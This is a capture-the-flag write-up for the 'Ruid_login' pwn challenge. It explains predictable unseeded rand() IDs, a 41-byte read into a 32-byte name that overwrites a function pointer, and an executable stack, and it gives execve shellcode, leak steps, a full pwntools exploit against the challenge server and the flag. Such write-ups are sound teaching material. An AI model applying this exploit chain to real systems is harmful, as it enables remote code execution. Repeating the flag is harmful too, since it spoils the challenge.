---
title: "Ruid_login"
summary: "Exploiting predictable RUIDs, buffer overflow, and executable stack for shellcode execution."
date: 2026-01-10
topics: ["pwn"]
ctfs: ["scarlet-26"]
tags: ["buffer-overflow", "shellcode", "function-pointer", "prng"]
difficulty: medium
draft: false
---

> Take a look at this super l33t login system I made for my Computer Architecture class! Heh...my prof is gonna be so proud. He's 100% gonna boost my GPA.
> 
> Surely this will be safe to push to prod. I'll even do it for him!

```sh
nc challs.ctf.rusec.club 4622
```
---

The challenge provides a university login system with role-based access control. Users authenticate via randomly generated RUIDs (Rutgers University IDs), and different roles grant different privileges.

---

## Binary protections

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
```

The binary has most standard protections enabled, but critically, the **stack is executable**. This immediately suggests a shellcode-based exploitation path.

---

## Reverse engineering

### User structure and initialization

The binary defines a user structure that stores names, RUIDs, and function pointers:

```c
struct user {
    char name[32];
    uint64_t fn;      // function pointer
    uint64_t ruid;    // random user ID
};
```

During initialization, two privileged users are created:

```c
int64_t setup_users() {
    char const* names[2];
    names[0] = &titles.prof;
    names[1] = &titles.dean;

    int64_t (* handlers[2])();
    handlers[0] = prof;
    handlers[1] = dean;
    
    for (int32_t i = 0; i <= 1; i += 1) {
        strcpy(&users[i], (&names)[i], &users);
        users[i].ruid = rand();  // predictable PRNG
        users[i].fn = handlers[i];
    }
}
```

The RUIDs are generated using `rand()` without seeding, making them **completely predictable** across runs.

---

### Authentication flow

The main loop prompts for a RUID and calls the corresponding user's function pointer if a match is found:

```c
printf("Please enter your RUID: ");
uint64_t ruid;
scanf("%lu%*c", &ruid);

for (int32_t i = 0; i <= 1; i += 1) {
    if (users[i].ruid == ruid) {
        printf("Welcome, %s!\n", &users[i]);
        users[i].fn();  // call function pointer
        match = 1;
    }
}
```

This design allows us to trigger arbitrary function pointers by authenticating as different users.

---

### Vulnerability: dean() overflow

The `dean()` function allows modifying staff member names but contains a critical buffer overflow:

```c
int64_t dean() {
    puts("Change a staff member's name!");
    list_ruids();

    int32_t user_idx;
    
    if (get_number(&user_idx, 2)) {
        printf("New name: ");
        read(0, &users[user_idx], 0x29);  // writes 41 bytes into 32-byte name
    }
}
```

The `read()` call accepts **41 bytes** into a **32-byte buffer**, allowing us to overflow into the function pointer (8 bytes) and partially into the RUID (1 byte).

---

### Shellcode injection point

Early in `main()`, the program reads a NetID into a stack buffer:

```c
char net_id[0x40];
read(0, &net_id, 0x40);
```

Since the stack is executable, this becomes our shellcode injection point.

---

## Exploitation strategy

The attack proceeds in four stages:

1. **Predict RUIDs** - Calculate the deterministic `rand()` values
2. **Inject shellcode** - Place shellcode on the stack via the NetID prompt
3. **Leak PIE base** - Overflow to leak a code pointer
4. **Leak stack address** - Redirect execution to leak a stack pointer
5. **Hijack control flow** - Point function pointer to shellcode

---

## Predicting RUIDs

Since `rand()` is unseeded, we can predict the values locally:

```python
from ctypes import CDLL

libc = CDLL("libc.so.6")
prof_ruid = libc.rand()  # first rand() -> Professor
dean_ruid = libc.rand()  # second rand() -> Dean
```

These values remain constant across all executions of the binary.

---

## Stage 1: Shellcode injection

We inject execve shellcode at the NetID prompt:

```python
shellcode = asm(
    """
    xor esi, esi
    xor edx, edx
    xor eax, eax
    push rax
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    mov al, 59
    syscall
    """
)

p.sendlineafter(b"Please enter your netID:", shellcode)
```

This shellcode executes `/bin/sh` and will be our final target.

---

## Stage 2: PIE leak

We authenticate as the Dean and overflow the Professor's name field:

```python
p.sendlineafter(b"Please enter your RUID:", str(dean_ruid).encode())
p.sendlineafter(b"Num:", b"0")
p.sendafter(b"New name:", b"A" * 32)
```

By writing exactly 32 bytes, we force the function pointer to be printed alongside the name, leaking a code address.

```python
p.recvuntil(b"[0] {RUID REDACTED} ")
leak = struct.unpack("<Q", p.recvline(keepends=False)[32:].ljust(8, b"\0"))[0]
bin.address = leak - 0x12f3
```

---

## Stage 3: Stack leak

We overwrite the Professor's function pointer with `puts@plt`:

```python
p.sendlineafter(b"RUID:", str(dean_ruid).encode())
p.sendlineafter(b"Num:", b"0")
p.sendafter(b"New name:", b"A" * 32 + p64(bin.plt["puts"]))
```

When we authenticate as the Professor, instead of calling the intended handler, `puts()` is invoked with the user structure's address, leaking a stack pointer:

```python
p.sendlineafter(b"your RUID:", str(prof_ruid).encode())
p.recvuntil(b"Welcome")
p.recvline()
stack_leak = struct.unpack("<Q", p.recvline(keepends=False).ljust(8, b"\0"))[0]
shell_addr = stack_leak + 0x1c0  # calculate shellcode location
```

---

## Stage 4: Shellcode execution

Finally, we overwrite the Professor's function pointer to point to our shellcode:

```python
p.sendlineafter(b"RUID:", str(dean_ruid).encode())
p.sendlineafter(b"Num:", b"0")
p.sendafter(b"New name:", b"A" * 32 + p64(shell_addr))
```

Authenticating as the Professor now triggers our shellcode:

```python
p.sendlineafter(b"RUID:", str(prof_ruid).encode())
p.interactive()
```

---

## Final exploit

```python
from ctypes import CDLL
from pwn import *

context.binary = bin = ELF("./ruid_login", checksec=False)

libc = CDLL("libc.so.6")
prof_ruid = libc.rand()
dean_ruid = libc.rand()

shellcode = asm(
    """
    xor esi, esi
    xor edx, edx
    xor eax, eax
    push rax
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    mov al, 59
    syscall
    """
)

p = remote("challs.ctf.rusec.club", 4622)

# Stage 1: Inject shellcode
p.sendlineafter(b"Please enter your netID:", shellcode)

# Stage 2: Leak PIE base
p.sendlineafter(b"Please enter your RUID:", str(dean_ruid).encode())
p.sendlineafter(b"Num:", b"0")
p.sendafter(b"New name:", b"A" * 32)

p.recvuntil(b"[0] {RUID REDACTED} ")
leak = struct.unpack("<Q", p.recvline(keepends=False)[32:].ljust(8, b"\0"))[0]
bin.address = leak - 0x12f3

# Stage 3: Leak stack address
p.sendlineafter(b"RUID:", str(dean_ruid).encode())
p.sendlineafter(b"Num:", b"0")
p.sendafter(b"New name:", b"A" * 32 + p64(bin.plt["puts"]))

p.sendlineafter(b"your RUID:", str(prof_ruid).encode())
p.recvuntil(b"Welcome")
p.recvline()
stack_leak = struct.unpack("<Q", p.recvline(keepends=False).ljust(8, b"\0"))[0]
shell_addr = stack_leak + 0x1c0

# Stage 4: Execute shellcode
p.sendlineafter(b"RUID:", str(dean_ruid).encode())
p.sendlineafter(b"Num:", b"0")
p.sendafter(b"New name:", b"A" * 32 + p64(shell_addr))

p.sendlineafter(b"RUID:", str(prof_ruid).encode())
p.interactive()
```

---

## Flag

```
RUSEC{w0w_th4ts_such_a_l0ng_net1D_w4it_w4it_wh4ts_g0ing_0n_uh_0h}
```
